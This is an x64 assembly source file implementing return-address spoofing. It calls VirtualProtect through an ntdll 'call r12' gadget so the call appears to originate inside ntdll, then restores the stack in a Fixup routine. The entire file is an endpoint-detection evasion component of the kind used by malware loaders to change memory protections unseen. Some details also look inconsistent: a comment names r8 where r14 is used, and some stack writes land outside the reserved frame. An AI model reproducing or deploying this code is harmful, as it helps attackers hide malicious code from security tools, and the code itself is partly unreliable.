; asm.asm - Return Address Spoofing
; Replaces the return address on the stack with an ntdll gadget
; so VirtualProtect appears to be called from within ntdll, not user code.
;
; The gadget is: call r12 (41 FF D4) found in ntdll .text
; After VirtualProtect returns, it hits the gadget which calls r12 (Fixup)
; Fixup restores the original stack and returns to the real caller.

section .text

global Do_Call
global Fixup

; Do_Call(PatchCall* call)
; rcx = pointer to PatchCall struct:
;   +0x00: Function (target API)
;   +0x08: nArgs (unused, we always pass 4 for VirtualProtect)
;   +0x10: Gadget (ntdll gadget address)
;   +0x18: Args[0] = lpAddress
;   +0x20: Args[1] = dwSize
;   +0x28: Args[2] = flNewProtect
;   +0x30: Args[3] = lpflOldProtect
Do_Call:
    ; Save non-volatile registers
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    push rbp

    ; Save current RSP so Fixup can restore it
    mov r13, rsp

    ; r10 = target API function
    mov r10, [rcx]          ; Function
    ; r8 (gadget) - temporarily store
    mov r14, [rcx + 0x10]   ; Gadget address

    ; Prepare the spoofed return path
    ; Reserve stack space: 0x100 for local frame + shadow space
    sub rsp, 0x100

    ; Set r12 to Fixup - the gadget will 'call r12' to reach Fixup
    lea r12, [rel Fixup]

    ; Save our real RSP + saved registers location for Fixup
    mov [rsp + 0x200 + 0x8], rsi
    mov [rsp + 0x200 + 0x10], rdi
    mov [rsp + 0x200 + 0x18], r12

    ; Create another frame for the call
    sub rsp, 0x200

    ; Place the gadget address as the return address
    mov [rsp], r14

    ; Restore VirtualProtect arguments from PatchCall struct
    mov r9, [rcx + 0x30]    ; lpflOldProtect (arg4)
    mov r8, [rcx + 0x28]    ; flNewProtect (arg3) - reinterpreted as DWORD
    mov rdx, [rcx + 0x20]   ; dwSize (arg2)
    mov rcx, [rcx + 0x18]   ; lpAddress (arg1)

    ; Jump to target API (not call - so it returns to our gadget)
    jmp r10

; Fixup - called by the gadget after the API returns
; Restores the original stack pointer and non-volatile registers
Fixup:
    ; r13 still holds our original RSP (non-volatile, preserved across calls)
    mov rsp, r13

    ; Restore non-volatile registers
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx

    ret
